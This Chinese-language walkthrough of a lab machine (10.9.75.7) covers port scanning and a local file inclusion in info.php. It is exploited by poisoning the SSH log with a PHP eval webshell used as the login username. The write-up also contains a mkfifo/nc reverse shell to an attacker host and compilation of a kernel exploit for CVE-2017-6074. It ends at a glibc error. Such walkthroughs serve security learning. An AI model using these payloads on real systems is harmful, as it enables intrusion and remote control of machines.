## nmap扫描



```bash
nmap --min-rate 10000 -p- 10.9.75.7
```

![image-20240114131914510](imgs/image-20240114131914510.png)

```bash
sudo nmap -sC -sT -sV -O -p21,80,2211,8888 10.9.75.7
```

![image-20240114131954556](imgs/image-20240114131954556.png)

访问80端口

![image-20240114132137915](imgs/image-20240114132137915.png)

## 目录扫描

```bash
└─$ dirb http://10.9.75.7
```

![image-20240114132216734](imgs/image-20240114132216734.png)

发现敏感目录

![image-20240114132327132](imgs/image-20240114132327132.png)

发现了PHP探针

http://10.9.75.7/antibot_image/antibots/info.php

![image-20240114132933255](imgs/image-20240114132933255.png)

在`info.php`查看源代码后发现敏感信息泄露

![image-20240114133011681](imgs/image-20240114133011681.png)

危险函数`include`

![image-20240114133114780](imgs/image-20240114133114780.png)

尝试一下读取日志

ssh的登录日志（在这里也可以是我们发现的指纹apache的日志）`var/log/auth.log`

先用一个根本不存在的用户,测试是否能够成功写入到 `log`中：` ssh aaaaaaaaa@10.9.75.7 -p2211`。

![image-20240114133859483](imgs/image-20240114133859483.png)

## 漏洞利用

尝试通过ssh登录上传一句话木马

扫描出2211为SSH服务

```bash
ssh '<?php @eval($_POST['saury']);?>'@10.9.75.7  -p 2211
```

![image-20240114134933861](imgs/image-20240114134933861.png)

蚁剑连接

![image-20240114134901189](imgs/image-20240114134901189.png)

![image-20240114135035049](imgs/image-20240114135035049.png)

接下来，就可以想办法进行权限提升了

反弹shell先

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.75.6 4444 >/tmp/f
```



![image-20240114141118370](imgs/image-20240114141118370.png)

![image-20240114141126769](imgs/image-20240114141126769.png)

生成可交互式shell

```bash
python3 -c"import pty;pty.spawn( '/bin/bash')"
```

下载漏洞 探测脚本，进行利用`https://github.com/The-Z-Labs/linux-exploit-suggester`

下载到本地，然后使用`python`开启服务，让靶机下载

![image-20240114141856110](imgs/image-20240114141856110.png)



![image-20240114141727204](imgs/image-20240114141727204.png)

给下载的脚步赋予执行权限

![image-20240114141950856](imgs/image-20240114141950856.png)

下载这个利用脚本

![image-20240114142250005](imgs/image-20240114142250005.png)



```c
gcc 41458.c -o CVE-2017-6074
```



![image-20240114143007845](imgs/image-20240114143007845.png)

赋予执行权限，但是报了一个错误

![image-20240114144313919](imgs/image-20240114144313919.png)



```
strings /lib/x86_64-linux-gnu/libc.so.6 |grep GLIBC_2.3
```

![image-20240114144512456](imgs/image-20240114144512456.png)

可以看到靶机上确实没有 `GLIBC_2.34`的
